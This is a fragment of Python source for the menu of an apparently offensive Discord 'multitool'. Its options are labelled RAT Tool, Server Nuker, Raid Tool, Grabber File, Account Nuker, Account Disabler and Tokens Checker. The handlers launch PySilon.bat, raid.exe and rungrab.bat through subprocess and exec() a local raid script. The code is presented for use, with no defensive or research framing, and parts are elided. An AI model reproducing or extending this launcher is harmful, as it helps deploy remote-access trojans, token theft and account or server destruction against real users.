...
\n          {y}[{w}01{y}]{w} RAT Tool            {y}[{w}06{y}]{w} Grabber File              {y}[{w}09{y}]{w} Account Nuker            {y}[{w}15{y}]{w} Tokens Checker
\n          {y}[{w}02{y}]{w} Server Nuker        {y}[{w}07{y}]{w} RAT Tool (grab too)       {y}[{w}10{y}]{w} Account Disabler         {y}[{w}16{y}]{w} Clear DM
\n          {y}[{w}03{y}]{w} Raid Tool           {y}[{w}08{y}]{w} soon                      {y}[{w}11{y}]{w} Account Generator        {y}[{w}17{y}]{w} House Changer
...
\t\t\t\t\t\t\t\t\t\t\t\t\t {y}[{b}>{y}]{w} Next Page""")
    ...
    if choice == '1':
        transition()
        subprocess.call([r'PySilon.bat'])
    elif choice == '2':
        transition()
        subprocess.call([r'raid.exe'])
    elif choice == '3':
        transition()
        raidtitle()
        ...
        transition()
        exec(open('util/4_RaidServer/abc').read()) # mettre un truc ici la 
    elif choice == '5':
        transition()
        subprocess.call([r'util\\5_VidCrashMaker\\crashvideomaker.bat'])
    elif choice == '6':
        transition()
        subprocess.call([r'rungrab.bat'])
    elif choice == '7':
        transition()
        imagegrabbertitle()
